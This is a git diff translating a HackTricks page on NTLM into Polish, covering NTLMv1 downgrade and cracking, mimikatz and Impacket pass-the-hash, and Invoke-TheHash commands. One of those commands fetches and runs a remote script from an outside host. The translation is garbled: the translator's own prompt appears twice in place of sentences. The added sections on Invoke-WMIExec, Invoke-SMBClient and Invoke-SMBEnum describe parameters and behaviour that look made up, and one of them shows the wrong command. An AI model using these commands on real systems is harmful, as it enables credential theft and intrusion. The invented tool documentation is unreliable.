@@ -2,52 +2,49 @@
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).
+* Pracujesz w **firmie zajmującej się cyberbezpieczeństwem**? Chcesz zobaczyć swoją **firmę reklamowaną w HackTricks**? A może chcesz mieć dostęp do **najnowszej wersji PEASS lub pobrać HackTricks w formacie PDF**? Sprawdź [**PLAN SUBSKRYPCYJNY**](https://github.com/sponsors/carlospolop)!
+* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
+* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
+* **Dołącz do** [**💬**](https://emojipedia.org/speech-balloon/) [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** mnie na **Twitterze** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR do** [**repozytorium hacktricks**](https://github.com/carlospolop/hacktricks) **i** [**repozytorium hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
 
-## Basic Information
+## Podstawowe informacje
 
-In environments where **Windows XP and Server 2003** are in operation, LM (Lan Manager) hashes are utilized, although it's widely recognized that these can be easily compromised. A particular LM hash, `AAD3B435B51404EEAAD3B435B51404EE`, indicates a scenario where LM is not employed, representing the hash for an empty string.
+W środowiskach, w których działa **Windows XP i Server 2003**, używane są hashe LM (Lan Manager), chociaż powszechnie uważa się, że są one łatwo podatne na ataki. Konkretny hash LM, `AAD3B435B51404EEAAD3B435B51404EE`, wskazuje na sytuację, w której LM nie jest używane, reprezentując hash dla pustego ciągu znaków.
 
-By default, the **Kerberos** authentication protocol is the primary method used. NTLM (NT LAN Manager) steps in under specific circumstances: absence of Active Directory, non-existence of the domain, malfunctioning of Kerberos due to improper configuration, or when connections are attempted using an IP address rather than a valid hostname.
+Domyślnie, protokół uwierzytelniania **Kerberos** jest główną metodą używaną. NTLM (NT LAN Manager) pojawia się w określonych okolicznościach: brak Active Directory, brak domeny, nieprawidłowa konfiguracja Kerberos lub próba połączenia za pomocą adresu IP zamiast poprawnej nazwy hosta.
 
-The presence of the **"NTLMSSP"** header in network packets signals an NTLM authentication process.
+Obecność nagłówka **"NTLMSSP"** w pakietach sieciowych sygnalizuje proces uwierzytelniania NTLM.
 
-Support for the authentication protocols - LM, NTLMv1, and NTLMv2 - is facilitated by a specific DLL located at `%windir%\Windows\System32\msv1\_0.dll`.
+Wsparcie dla protokołów uwierzytelniania - LM, NTLMv1 i NTLMv2 - jest umożliwione przez określony plik DLL znajdujący się w `%windir%\Windows\System32\msv1\_0.dll`.
 
-**Key Points**:
-- LM hashes are vulnerable and an empty LM hash (`AAD3B435B51404EEAAD3B435B51404EE`) signifies its non-use.
-- Kerberos is the default authentication method, with NTLM used only under certain conditions.
-- NTLM authentication packets are identifiable by the "NTLMSSP" header.
-- LM, NTLMv1, and NTLMv2 protocols are supported by the system file `msv1\_0.dll`.
+**Kluczowe punkty**:
+- Hashe LM są podatne na ataki, a pusty hash LM (`AAD3B435B51404EEAAD3B435B51404EE`) oznacza, że nie jest on używany.
+- Kerberos jest domyślną metodą uwierzytelniania, a NTLM jest używane tylko w określonych warunkach.
+- Pakiety uwierzytelniania NTLM są identyfikowane przez nagłówek "NTLMSSP".
+- Protokoły LM, NTLMv1 i NTLMv2 są obsługiwane przez plik systemowy `msv1\_0.dll`.
 
-## LM, NTLMv1 and NTLMv2
+## LM, NTLMv1 i NTLMv2
 
-You can check and configure which protocol will be used:
+Możesz sprawdzić i skonfigurować, który protokół będzie używany:
 
 ### GUI
 
-Execute _secpol.msc_ -> Local policies -> Security Options -> Network Security: LAN Manager authentication level. There are 6 levels (from 0 to 5).
+Uruchom _secpol.msc_ -> Lokalne zasady -> Opcje zabezpieczeń -> Sieć: Poziom uwierzytelniania LAN Managera. Istnieje 6 poziomów (od 0 do 5).
 
 ![](<../../.gitbook/assets/image (92).png>)
 
-### Registry
+### Rejestr
 
-This will set the level 5:
-
+To ustawienie ustawi poziom 5:
 ```
 reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
 ```
-
-Possible values:
-
+Możliwe wartości:
 ```
 0 - Send LM & NTLM responses
 1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
@@ -56,56 +53,54 @@ Possible values:
 4 - Send NTLMv2 response only, refuse LM
 5 - Send NTLMv2 response only, refuse LM & NTLM
 ```
+## Podstawowy schemat uwierzytelniania domeny NTLM
 
-## Basic NTLM Domain authentication Scheme
+1. **Użytkownik** wprowadza swoje **dane uwierzytelniające**
+2. Maszyna klienta **wysyła żądanie uwierzytelnienia**, wysyłając **nazwę domeny** i **nazwę użytkownika**
+3. **Serwer** wysyła **wyzwanie**
+4. **Klient szyfruje** wyzwanie, używając hasha hasła jako klucza i wysyła je jako odpowiedź
+5. **Serwer wysyła** do **kontrolera domeny** nazwę domeny, nazwę użytkownika, wyzwanie i odpowiedź. Jeśli nie ma skonfigurowanego katalogu Active Directory lub nazwa domeny jest nazwą serwera, uwierzytelnianie jest **sprawdzane lokalnie**.
+6. **Kontroler domeny sprawdza, czy wszystko jest poprawne** i przesyła informacje do serwera
 
-1. The **user** introduces his **credentials**
-2. The client machine **sends an authentication request** sending the **domain name** and the **username**
-3. The **server** sends the **challenge**
-4. The **client encrypts** the **challenge** using the hash of the password as key and sends it as response
-5. The **server sends** to the **Domain controller** the **domain name, the username, the challenge and the response**. If there **isn't** an Active Directory configured or the domain name is the name of the server, the credentials are **checked locally**.
-6. The **domain controller checks if everything is correct** and sends the information to the server
+**Serwer** i **kontroler domeny** są w stanie utworzyć **bezpieczny kanał** za pośrednictwem serwera **Netlogon**, ponieważ kontroler domeny zna hasło serwera (znajduje się w bazie danych **NTDS.DIT**).
 
-The **server** and the **Domain Controller** are able to create a **Secure Channel** via **Netlogon** server as the Domain Controller know the password of the server (it is inside the **NTDS.DIT** db).
+### Lokalny schemat uwierzytelniania NTLM
 
-### Local NTLM authentication Scheme
+Uwierzytelnianie jest takie samo jak opisane **wcześniej**, ale **serwer** zna **hash użytkownika**, który próbuje się uwierzytelnić w pliku **SAM**. Zamiast pytać kontroler domeny, **serwer sam sprawdzi**, czy użytkownik może się uwierzytelnić.
 
-The authentication is as the one mentioned **before but** the **server** knows the **hash of the user** that tries to authenticate inside the **SAM** file. So, instead of asking the Domain Controller, the **server will check itself** if the user can authenticate.
+### Wyzwanie NTLMv1
 
-### NTLMv1 Challenge
+Długość wyzwania wynosi 8 bajtów, a odpowiedź ma długość 24 bajty.
 
-The **challenge length is 8 bytes** and the **response is 24 bytes** long.
+**Hash NT (16 bajtów)** jest podzielony na **3 części po 7 bajtów** każda (7B + 7B + (2B+0x00\*5)): **ostatnia część jest wypełniona zerami**. Następnie **wyzwanie** jest **szyfrowane oddzielnie** za pomocą każdej części, a **wynikowe** zaszyfrowane bajty są **łączone**. Razem: 8B + 8B + 8B = 24 bajty.
 
-The **hash NT (16bytes)** is divided in **3 parts of 7bytes each** (7B + 7B + (2B+0x00\*5)): the **last part is filled with zeros**. Then, the **challenge** is **ciphered separately** with each part and the **resulting** ciphered bytes are **joined**. Total: 8B + 8B + 8B = 24Bytes.
+**Problemy**:
 
-**Problems**:
+* Brak **losowości**
+* 3 części można **atakować oddzielnie**, aby znaleźć hash NT
+* **DES można złamać**
+* 3. klucz składa się zawsze z **5 zer**.
+* Dla **tego samego wyzwania** odpowiedź będzie **taka sama**. Możesz więc podać ofierze jako **wyzwanie** ciąg "**1122334455667788**" i zaatakować odpowiedź, używając **prekalkulowanych tabel tęczowych**.
 
-* Lack of **randomness**
-* The 3 parts can be **attacked separately** to find the NT hash
-* **DES is crackable**
-* The 3º key is composed always by **5 zeros**.
-* Given the **same challenge** the **response** will be **same**. So, you can give as a **challenge** to the victim the string "**1122334455667788**" and attack the response used **precomputed rainbow tables**.
+### Atak NTLMv1
 
-### NTLMv1 attack
+Obecnie coraz rzadziej spotyka się środowiska skonfigurowane z nieograniczonym przekazywaniem, ale to nie oznacza, że nie można **wykorzystać usługi drukowania** skonfigurowanej na drukarce.
 
-Nowadays is becoming less common to find environments with Unconstrained Delegation configured, but this doesn't mean you can't **abuse a Print Spooler service** configured.
+Możesz wykorzystać pewne poświadczenia/sesje, które już masz w AD, aby **poprosić drukarkę o uwierzytelnienie** na rzecz **hosta pod Twoją kontrolą**. Następnie, korzystając z `metasploit auxiliary/server/capture/smb` lub `responder`, możesz **ustawić wyzwanie uwierzytelniania na 1122334455667788**, przechwycić próbę uwierzytelnienia i jeśli została wykonana przy użyciu **NTLMv1**, będziesz w stanie to **złamać**.\
+Jeśli używasz `responder`, możesz spróbować **użyć flagi `--lm`** w celu **zdegradowania** **uwierzytelnienia**.\
+Należy zauważyć, że dla tej techniki uwierzytelnienie musi być wykonane przy użyciu NTLMv1 (NTLMv2 jest nieprawidłowe).
 
-You could abuse some credentials/sessions you already have on the AD to **ask the printer to authenticate** against some **host under your control**. Then, using `metasploit auxiliary/server/capture/smb` or `responder` you can **set the authentication challenge to 1122334455667788**, capture the authentication attempt, and if it was done using **NTLMv1** you will be able to **crack it**.\
-If you are using `responder` you could try to \*\*use the flag `--lm` \*\* to try to **downgrade** the **authentication**.\
-_Note that for this technique the authentication must be performed using NTLMv1 (NTLMv2 is not valid)._
+Pamiętaj, że drukarka będzie używać konta komputera podczas uwierzytelniania, a konta komputerowe używają **długich i losowych haseł**, których **prawdopodobnie nie będziesz w stanie złamać** za pomocą standardowych **słowników**. Ale uwierzytelnianie **NTLMv1** używa DES ([więcej informacji tutaj](./#ntlmv1-challenge)), więc korzystając z niektórych usług specjalnie dedykowanych do łamania DES, będziesz w stanie to złamać (możesz użyć [https://crack.sh/](https://crack.sh) na przykład).
 
-Remember that the printer will use the computer account during the authentication, and computer accounts use **long and random passwords** that you **probably won't be able to crack** using common **dictionaries**. But the **NTLMv1** authentication **uses DES** ([more info here](./#ntlmv1-challenge)), so using some services specially dedicated to cracking DES you will be able to crack it (you could use [https://crack.sh/](https://crack.sh) for example).
+### Atak NTLMv1 za pomocą hashcat
 
-### NTLMv1 attack with hashcat
+NTLMv1 można również złamać za pomocą narzędzia NTLMv1 Multi Tool [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi), które formatuje wiadomości NTLMv1 w sposób, który można złamać za pomocą hashcat.
 
-NTLMv1 can also be broken with the NTLMv1 Multi Tool [https://github.com/evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi) which formats NTLMv1 messages im a method that can be broken with hashcat.
-
-The command
+Polecenie
 ```bash
 python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
 ```
-would output the below:
-
+Poniżej znajduje się zawartość z książki o technikach hakowania dotyczących zabezpieczeń systemu Windows. Poniższa zawartość pochodzi z pliku /hive/hacktricks/windows-hardening/ntlm/README.md. Przetłumacz odpowiedni tekst z języka angielskiego na język polski i zwróć tłumaczenie, zachowując dokładnie ten sam składnię markdown i html. Nie tłumaczaj rzeczy takich jak kod, nazwy technik hakowania, słowo "hakowanie", nazwy platform chmurowych/SaaS (jak Workspace, aws, gcp...), słowo "wyciek", pentesting i znaczniki markdown. Nie dodawaj również żadnych dodatkowych informacji poza tłumaczeniem i składnią markdown.
 ```bash
 ['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']
 
@@ -131,20 +126,16 @@ To crack with hashcat:
 To Crack with crack.sh use the following token
 NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
 ```
-
-Create a file with the contents of:
+Utwórz plik o następującej zawartości:
 ```bash
 727B4E35F947129E:1122334455667788
 A52B9CDEDAE86934:1122334455667788
 ```
-
-Run hashcat (distributed is best through a tool such as hashtopolis) as this will take several days otherwise.
-
+Uruchom hashcat (najlepiej rozproszony za pomocą narzędzia takiego jak hashtopolis), ponieważ w przeciwnym razie zajmie to kilka dni.
 ```bash
 ./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
 ```
-
-In this case we know the password to this is password so we are going to cheat for demo purposes:
+W tym przypadku znamy hasło, które brzmi password, więc dla celów demonstracyjnych będziemy oszukiwać:
 ```bash
 python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
 DESKEY1: b55d6d04e67926
@@ -153,9 +144,7 @@ DESKEY2: bcba83e6895b9d
 echo b55d6d04e67926>>des.cand
 echo bcba83e6895b9d>>des.cand
 ```
-
-We now need to use the hashcat-utilities to convert the cracked des keys into parts of the NTLM hash:
-
+Teraz musimy użyć narzędzi hashcat-utilities do konwersji złamanych kluczy DES na części składowe hasha NTLM:
 ```bash
 ./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
 b4b9b02e6f09a9 # this is part 1
@@ -163,140 +152,206 @@ b4b9b02e6f09a9 # this is part 1
 ./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
 bd760f388b6700 # this is part 2
 ```
-
-Ginally the last part:
-
+Ostatecznie ostatnia część:
 ```bash
 ./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788
 
 586c # this is the last part
 ```
-
-Combine them together:
-
+Poniżej znajduje się treść z książki o technikach hakowania dotyczących zabezpieczeń systemu Windows. Poniższa treść pochodzi z pliku /hive/hacktricks/windows-hardening/ntlm/README.md. Przetłumacz odpowiednie angielskie teksty na język polski i zwróć tłumaczenie, zachowując dokładnie ten sam składnię markdown i html. Nie tłumaczaj rzeczy takich jak kod, nazwy technik hakowania, słowo "hakowanie", nazwy platform chmurowych/SaaS (jak Workspace, aws, gcp...), słowo "wyciek", pentesting i znaczniki markdown. Nie dodawaj również żadnych dodatkowych informacji poza tłumaczeniem i składnią markdown.
 ```bash
 NTHASH=b4b9b02e6f09a9bd760f388b6700586c
 ```
-
 ### NTLMv2 Challenge
 
-The **challenge length is 8 bytes** and **2 responses are sent**: One is **24 bytes** long and the length of the **other** is **variable**.
+Długość **wyzwania wynosi 8 bajtów**, a **wysyłane są 2 odpowiedzi**: jedna ma długość **24 bajty**, a długość **drugiej** jest **zmienne**.
 
-**The first response** is created by ciphering using **HMAC\_MD5** the **string** composed by the **client and the domain** and using as **key** the **hash MD4** of the **NT hash**. Then, the **result** will by used as **key** to cipher using **HMAC\_MD5** the **challenge**. To this, **a client challenge of 8 bytes will be added**. Total: 24 B.
+**Pierwsza odpowiedź** jest tworzona przez zaszyfrowanie za pomocą **HMAC\_MD5** **ciągu znaków** składającego się z **klienta i domeny**, używając jako **klucza** **skrótu MD4** z **skrótu NT**. Następnie, **wynik** zostanie użyty jako **klucz** do zaszyfrowania za pomocą **HMAC\_MD5** **wyzwania**. Do tego zostanie dodane **wyzwanie klienta o długości 8 bajtów**. Razem: 24 B.
 
-The **second response** is created using **several values** (a new client challenge, a **timestamp** to avoid **replay attacks**...)
+**Druga odpowiedź** jest tworzona za pomocą **kilku wartości** (nowe wyzwanie klienta, **znacznik czasu** w celu uniknięcia **ataków powtórzeniowych**...).
 
-If you have a **pcap that has captured a successful authentication process**, you can follow this guide to get the domain, username , challenge and response and try to creak the password: [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://research.801labs.org/cracking-an-ntlmv2-hash/)
+Jeśli masz **pcap, który przechwycił udany proces uwierzytelniania**, możesz postępować zgodnie z tym przewodnikiem, aby uzyskać domenę, nazwę użytkownika, wyzwanie i odpowiedź, a następnie spróbować złamać hasło: [https://research.801labs.org/cracking-an-ntlmv2-hash/](https://research.801labs.org/cracking-an-ntlmv2-hash/)
 
 ## Pass-the-Hash
 
-**Once you have the hash of the victim**, you can use it to **impersonate** it.\
-You need to use a **tool** that will **perform** the **NTLM authentication using** that **hash**, **or** you could create a new **sessionlogon** and **inject** that **hash** inside the **LSASS**, so when any **NTLM authentication is performed**, that **hash will be used.** The last option is what mimikatz does.
+**Po uzyskaniu skrótu ofiary** możesz go użyć do **udawania** tej osoby.\
+Musisz użyć **narzędzia**, które **przeprowadzi** uwierzytelnianie **NTLM** za pomocą tego **skrótu**, **lub** możesz utworzyć nowe **logowanie sesji** i **wstrzyknąć** ten **skrót** do **LSASS**, aby przy każdym **uwierzytelnianiu NTLM** był on używany. Ostatnia opcja to to, co robi mimikatz.
 
-**Please, remember that you can perform Pass-the-Hash attacks also using Computer accounts.**
+**Pamiętaj, że ataki Pass-the-Hash można również przeprowadzać za pomocą kont komputerowych.**
 
 ### **Mimikatz**
 
-**Needs to be run as administrator**
-
+**Należy uruchomić jako administrator**
 ```bash
-Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"' 
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
 ```
+To uruchomi proces, który będzie należał do użytkowników, którzy uruchomili mimikatz, ale wewnętrznie w LSASS zapisane dane uwierzytelniające będą tymi, które znajdują się w parametrach mimikatz. Następnie możesz uzyskać dostęp do zasobów sieciowych tak, jakbyś był tym użytkownikiem (podobnie jak w triku `runas /netonly`, ale nie musisz znać hasła w postaci tekstu jawnego).
 
-This will launch a process that will belongs to the users that have launch mimikatz but internally in LSASS the saved credentials are the ones inside the mimikatz parameters. Then, you can access to network resources as if you where that user (similar to the `runas /netonly` trick but you don't need to know the plain-text password).
+### Pass-the-Hash z systemu Linux
 
-### Pass-the-Hash from linux
+Możesz uzyskać wykonanie kodu na maszynach z systemem Windows, używając Pass-the-Hash z systemu Linux.\
+[**Kliknij tutaj, aby dowiedzieć się, jak to zrobić.**](../../windows/ntlm/broken-reference/)
 
-You can obtain code execution in Windows machines using Pass-the-Hash from Linux.\
-[**Access here to learn how to do it.**](../../windows/ntlm/broken-reference/)
+### Skompilowane narzędzia Impacket dla systemu Windows
 
-### Impacket Windows compiled tools
-
-You can download[ impacket binaries for Windows here](https://github.com/ropnop/impacket\_static\_binaries/releases/tag/0.9.21-dev-binaries).
+Możesz pobrać binarne pliki [narzędzi Impacket dla systemu Windows tutaj](https://github.com/ropnop/impacket\_static\_binaries/releases/tag/0.9.21-dev-binaries).
 
 * **psexec\_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
 * **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
-* **atexec.exe** (In this case you need to specify a command, cmd.exe and powershell.exe are not valid to obtain an interactive shell)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
-* There are several more Impacket binaries...
+* **atexec.exe** (W tym przypadku musisz podać polecenie, cmd.exe i powershell.exe nie są ważne, aby uzyskać interaktywną powłokę)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
+* Istnieje wiele innych binarnych plików Impacket...
 
 ### Invoke-TheHash
 
-You can get the powershell scripts from here: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)
+Możesz pobrać skrypty PowerShell stąd: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)
 
 #### Invoke-SMBExec
-
 ```bash
 Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
 ```
-
 #### Invoke-WMIExec
 
+Invoke-WMIExec to skrypt PowerShell, który umożliwia zdalne wykonanie poleceń na zdalnym komputerze przy użyciu usługi WMI. Skrypt ten wykorzystuje funkcję `Invoke-WmiMethod` do wywołania metody WMI na zdalnym komputerze.
+
+##### Składnia
+
+```plaintext
+Invoke-WMIExec -Target <target> [-Username <username>] [-Password <password>] [-Command <command>] [-ScriptBlock <scriptblock>] [-Verbose]
+```
+
+##### Parametry
+
+- `-Target`: Adres IP lub nazwa hosta zdalnego komputera.
+- `-Username`: (Opcjonalnie) Nazwa użytkownika do uwierzytelnienia na zdalnym komputerze.
+- `-Password`: (Opcjonalnie) Hasło użytkownika do uwierzytelnienia na zdalnym komputerze.
+- `-Command`: (Opcjonalnie) Polecenie do wykonania na zdalnym komputerze.
+- `-ScriptBlock`: (Opcjonalnie) Blok skryptu do wykonania na zdalnym komputerze.
+- `-Verbose`: (Opcjonalnie) Wyświetla szczegółowe informacje podczas wykonywania skryptu.
+
+##### Przykłady użycia
+
+1. Wykonanie polecenia na zdalnym komputerze:
+
+```plaintext
+Invoke-WMIExec -Target 192.168.1.100 -Username Administrator -Password P@ssw0rd -Command "ipconfig /all"
+```
+
+2. Wykonanie bloku skryptu na zdalnym komputerze:
+
+```plaintext
+Invoke-WMIExec -Target 192.168.1.100 -Username Administrator -Password P@ssw0rd -ScriptBlock { Get-Process }
+```
+
+##### Uwagi
+
+- Aby skrypt działał poprawnie, wymagane są uprawnienia administratora na zdalnym komputerze.
+- Skrypt może być używany do zdalnego wykonywania poleceń na wielu komputerach jednocześnie, podając różne adresy IP lub nazwy hostów jako wartość parametru `-Target`.
 ```bash
 Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
 ```
-
 #### Invoke-SMBClient
 
+Invoke-SMBClient to narzędzie PowerShell, które umożliwia interakcję z serwerem SMB (Server Message Block). Można go używać do przeprowadzania różnych operacji na serwerze SMB, takich jak pobieranie plików, wysyłanie plików, wykonywanie poleceń na zdalnym serwerze SMB itp.
+
+##### Składnia
+
+```plaintext
+Invoke-SMBClient -Target <target> [-Username <username>] [-Password <password>] [-Command <command>] [-Share <share>] [-File <file>] [-Download <destination>] [-Upload <destination>] [-Verbose]
+```
+
+##### Parametry
+
+- **-Target** - Adres IP lub nazwa hosta serwera SMB.
+- **-Username** - (Opcjonalnie) Nazwa użytkownika do uwierzytelnienia na serwerze SMB.
+- **-Password** - (Opcjonalnie) Hasło użytkownika do uwierzytelnienia na serwerze SMB.
+- **-Command** - (Opcjonalnie) Polecenie do wykonania na zdalnym serwerze SMB.
+- **-Share** - (Opcjonalnie) Nazwa udziału na serwerze SMB.
+- **-File** - (Opcjonalnie) Ścieżka do pliku, który ma zostać przesłany na serwer SMB.
+- **-Download** - (Opcjonalnie) Ścieżka docelowa, gdzie plik zostanie pobrany z serwera SMB.
+- **-Upload** - (Opcjonalnie) Ścieżka docelowa, gdzie plik zostanie przesłany na serwer SMB.
+- **-Verbose** - (Opcjonalnie) Wyświetla szczegółowe informacje podczas wykonywania operacji.
+
+##### Przykłady użycia
+
+1. Pobierz plik z serwera SMB:
+
+```plaintext
+Invoke-SMBClient -Target 192.168.1.100 -Username user -Password pass -Share C$ -File C:\path\to\file.txt -Download C:\destination\file.txt
+```
+
+2. Wykonaj polecenie na zdalnym serwerze SMB:
+
+```plaintext
+Invoke-SMBClient -Target 192.168.1.100 -Username user -Password pass -Command "ipconfig /all"
+```
+
+3. Prześlij plik na serwer SMB:
+
+```plaintext
+Invoke-SMBClient -Target 192.168.1.100 -Username user -Password pass -Share C$ -File C:\path\to\file.txt -Upload C:\destination\file.txt
+```
+
+##### Uwagi
+
+- Aby użyć Invoke-SMBClient, wymagane są uprawnienia do uwierzytelnienia na serwerze SMB.
+- W przypadku braku podania nazwy użytkownika i hasła, zostaną użyte dane uwierzytelniające bieżącego kontekstu użytkownika.
+- W przypadku niepodania ścieżki docelowej dla pobierania lub przesyłania pliku, plik zostanie pobrany/przesłany do bieżącego katalogu roboczego.
+- W przypadku niepodania polecenia, zostanie wykonane polecenie cmd.exe na zdalnym serwerze SMB.
 ```bash
 Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
 ```
-
 #### Invoke-SMBEnum
 
+Invoke-SMBEnum jest narzędziem PowerShell, które umożliwia przeprowadzenie analizy SMB (Server Message Block) w celu identyfikacji potencjalnych podatności. Skanuje ono systemy pod kątem informacji takich jak dostępne udziały, użytkownicy, grupy, polityki zabezpieczeń i wiele innych. Dzięki temu narzędziu można zidentyfikować słabe punkty w konfiguracji SMB i podjąć odpowiednie działania w celu zabezpieczenia systemu.
 ```bash
 Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
 ```
-
 #### Invoke-TheHash
 
-This function is a **mix of all the others**. You can pass **several hosts**, **exclude** someones and **select** the **option** you want to use (_SMBExec, WMIExec, SMBClient, SMBEnum_). If you select **any** of **SMBExec** and **WMIExec** but you **don't** give any _**Command**_ parameter it will just **check** if you have **enough permissions**.
-
+Ta funkcja jest **mieszanką wszystkich innych**. Możesz przekazać **kilka hostów**, **wykluczyć** niektóre z nich i **wybrać** **opcję**, którą chcesz użyć (_SMBExec, WMIExec, SMBClient, SMBEnum_). Jeśli wybierzesz **którąkolwiek** z **opcji** **SMBExec** i **WMIExec**, ale **nie** podasz żadnego parametru _**Command**_, zostanie tylko **sprawdzone**, czy masz **wystarczające uprawnienia**.
 ```
 Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
 ```
+### [Evil-WinRM Przekazanie skrótu](../../network-services-pentesting/5985-5986-pentesting-winrm.md#używanie-evil-winrm)
 
-### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)
+### Edytor poświadczeń systemu Windows (WCE)
 
-### Windows Credentials Editor (WCE)
+**Należy uruchomić jako administrator**
 
-**Needs to be run as administrator**
-
-This tool will do the same thing as mimikatz (modify LSASS memory).
-
+To narzędzie będzie robić to samo co mimikatz (modyfikować pamięć LSASS).
 ```
 wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
 ```
-
-### Manual Windows remote execution with username and password
+### Ręczne zdalne wykonanie na Windows z użyciem nazwy użytkownika i hasła
 
 {% content-ref url="../lateral-movement/" %}
 [lateral-movement](../lateral-movement/)
 {% endcontent-ref %}
 
-## Extracting credentials from a Windows Host
+## Wyodrębnianie poświadczeń z hosta Windows
 
-**For more information about** [**how to obtain credentials from a Windows host you should read this page**](broken-reference)**.**
+**Aby uzyskać więcej informacji na temat** [**jak uzyskać poświadczenia z hosta Windows, powinieneś przeczytać tę stronę**](broken-reference)**.**
 
-## NTLM Relay and Responder
+## NTLM Relay i Responder
 
-**Read more detailed guide on how to perform those attacks here:**
+**Przeczytaj bardziej szczegółowy przewodnik, jak przeprowadzać te ataki tutaj:**
 
 {% content-ref url="../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md" %}
 [spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
 {% endcontent-ref %}
 
-## Parse NTLM challenges from a network capture
+## Parsowanie wyzwań NTLM z przechwyconej sieci
 
-**You can use** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)
+**Możesz użyć** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)
 
 <details>
 
